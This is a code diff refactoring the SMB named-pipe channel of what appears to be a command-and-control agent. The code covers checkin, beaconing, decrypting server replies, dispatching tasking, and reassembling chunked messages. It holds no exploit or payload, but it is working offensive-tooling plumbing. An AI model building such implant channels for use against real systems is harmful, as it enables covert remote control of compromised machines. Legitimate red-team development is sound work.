@@ -62,25 +62,16 @@ namespace Agent.Profiles
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
-            //Write our checkin message to the pipe
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
-            //Wait for a bounded interval for a checkin response message.
-            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
+            if (!await CheckinResponseWait.WaitAsync(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
             {
                 return new CheckinResponse { status = "failed" };
             }
 
-            //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
             return this.cir;
         }
-
-        private static Task<bool> WaitForCheckinResponse(
-            ManualResetEventSlim signal,
-            TimeSpan timeout,
-            CancellationToken cancellationToken) =>
-            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);
 
         public async Task StartBeacon()
         {
@@ -92,7 +83,7 @@ namespace Agent.Profiles
                 {
                     try
                     {
-                        await WaitWhileIdle(cancellationTokenSource.Token);
+                        await Task.Delay(100, cancellationTokenSource.Token);
                     }
                     catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                     {
@@ -108,7 +99,7 @@ namespace Agent.Profiles
                         result => result);
                     this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
                     this.currentAttempt++;
                 }
@@ -118,11 +109,6 @@ namespace Agent.Profiles
                     this.cancellationTokenSource.Cancel();
                 }
             }
-        }
-
-        private static Task WaitWhileIdle(CancellationToken cancellationToken)
-        {
-            return Task.Delay(100, cancellationToken);
         }
 
         internal async Task<bool> Send(string json)
@@ -151,7 +137,6 @@ namespace Agent.Profiles
                     sm.final = index == parts.Length - 1;
                     await this.serverPipe.WriteAsync(sm);
                 }
-
             }
             catch
             {
@@ -176,7 +161,7 @@ namespace Agent.Profiles
                 guid = Guid.NewGuid().ToString(),
                 message_type = "success",
                 final = true,
-                delegate_message = String.Empty,
+                delegate_message = string.Empty,
                 agent_guid = agentConfig.uuid,
             };
 
@@ -200,7 +185,7 @@ namespace Agent.Profiles
 
                 await this.SendSuccess();
             }
-            catch (Exception e)
+            catch (Exception)
             {
             }
         }
@@ -209,10 +194,10 @@ namespace Agent.Profiles
         {
             onClientConnectedSignal.Set();
             this.connected = true;
-            await this.SendUpdate();
+            await this.SendSuccess();
         }
 
-        private async Task OnClientDisconnect()
+        private Task OnClientDisconnect()
         {
             this.connected = false;
             onClientConnectedSignal.Reset();
@@ -220,6 +205,7 @@ namespace Agent.Profiles
             {
                 this.partialMessages.Clear();
             }
+            return Task.CompletedTask;
         }
 
         private bool TryAccumulateMessage(SmbMessage message, DateTimeOffset now, out string completeMessage)
@@ -232,38 +218,16 @@ namespace Agent.Profiles
 
             lock (partialMessagesLock)
             {
-                foreach (var stale in partialMessages.Where(entry => now - entry.Value.UpdatedAt > PartialMessageMaxAge).ToArray())
-                {
-                    partialMessages.TryRemove(stale.Key, out _);
-                }
-                foreach (string completed in completedMessages.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
-                {
-                    completedMessages.Remove(completed);
-                }
+                PruneExpiredMessages(now);
                 if (completedMessages.ContainsKey(message.guid))
                 {
                     return false;
                 }
 
-                if (!partialMessages.TryGetValue(message.guid, out PartialMessage? partial))
-                {
-                    while (partialMessages.Count >= MaxPartialMessages)
-                    {
-                        RemoveOldestPartialMessage();
-                    }
-                    partial = new PartialMessage(now);
-                    partialMessages[message.guid] = partial;
-                }
-
+                PartialMessage partial = GetOrCreatePartialMessage(message.guid, now);
                 int incomingBytes = Encoding.UTF8.GetByteCount(message.delegate_message);
-                int totalBytes = partialMessages.Values.Sum(entry => entry.ByteCount);
-                while (totalBytes + incomingBytes > MaxPartialMessageBytes && partialMessages.Count > 1)
+                if (!TryEnsurePartialCapacity(message.guid, incomingBytes))
                 {
-                    totalBytes -= RemoveOldestPartialMessage(message.guid);
-                }
-                if (totalBytes + incomingBytes > MaxPartialMessageBytes)
-                {
-                    partialMessages.TryRemove(message.guid, out _);
                     return false;
                 }
 
@@ -275,16 +239,62 @@ namespace Agent.Profiles
                     return false;
                 }
 
-                completeMessage = partial.Content.ToString();
                 partialMessages.TryRemove(message.guid, out _);
                 if (completedMessages.Count >= MaxCompletedMessages)
                 {
-                    completeMessage = string.Empty;
                     return false;
                 }
+
+                completeMessage = partial.Content.ToString();
                 completedMessages[message.guid] = now.Add(CompletedMessageMaxAge);
                 return true;
             }
+        }
+
+        private void PruneExpiredMessages(DateTimeOffset now)
+        {
+            foreach (var stale in partialMessages.Where(entry => now - entry.Value.UpdatedAt > PartialMessageMaxAge).ToArray())
+            {
+                partialMessages.TryRemove(stale.Key, out _);
+            }
+            foreach (string completed in completedMessages.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
+            {
+                completedMessages.Remove(completed);
+            }
+        }
+
+        private PartialMessage GetOrCreatePartialMessage(string guid, DateTimeOffset now)
+        {
+            if (partialMessages.TryGetValue(guid, out PartialMessage? partial))
+            {
+                return partial;
+            }
+
+            while (partialMessages.Count >= MaxPartialMessages)
+            {
+                RemoveOldestPartialMessage();
+            }
+
+            partial = new PartialMessage(now);
+            partialMessages[guid] = partial;
+            return partial;
+        }
+
+        private bool TryEnsurePartialCapacity(string guid, int incomingBytes)
+        {
+            int totalBytes = partialMessages.Values.Sum(entry => entry.ByteCount);
+            while (totalBytes + incomingBytes > MaxPartialMessageBytes && partialMessages.Count > 1)
+            {
+                totalBytes -= RemoveOldestPartialMessage(guid);
+            }
+
+            if (totalBytes + incomingBytes <= MaxPartialMessageBytes)
+            {
+                return true;
+            }
+
+            partialMessages.TryRemove(guid, out _);
+            return false;
         }
 
         private int RemoveOldestPartialMessage(string? except = null)
@@ -306,10 +316,10 @@ namespace Agent.Profiles
         {
             try
             {
-                //If we haven't checked in yet, the only message this can really be is a checkin.
+                string plaintext = this.crypt.Decrypt(message);
                 if (!checkedin)
                 {
-                    CheckinResponse? response = JsonSerializer.Deserialize(this.crypt.Decrypt(message), CheckinResponseJsonContext.Default.CheckinResponse);
+                    CheckinResponse? response = JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
                     if (!CheckinResponseValidation.IsSuccessful(response))
                     {
                         return Task.CompletedTask;
@@ -321,11 +331,10 @@ namespace Agent.Profiles
                 }
 
                 //If we make it to here, it's a tasking response
-                GetTaskingResponse? gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                GetTaskingResponse? gtr = JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                 if (gtr?.action == "get_tasking")
                 {
-                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                    this.SetTaskingReceived?.Invoke(this, tra);
+                    this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(gtr));
                 }
             }
             catch
@@ -333,19 +342,6 @@ namespace Agent.Profiles
                 // Peer-controlled ciphertext and JSON must not escape the receive callback.
             }
             return Task.CompletedTask;
-        }
-        private async Task SendUpdate()
-        {
-            SmbMessage sm = new SmbMessage()
-            {
-                guid = Guid.NewGuid().ToString(),
-                final = true,
-                message_type = "success",
-                delegate_message = "",
-                agent_guid = this.agentConfig.uuid
-            };
-
-            await this.serverPipe.WriteAsync(sm);
         }
 
         private sealed class PartialMessage
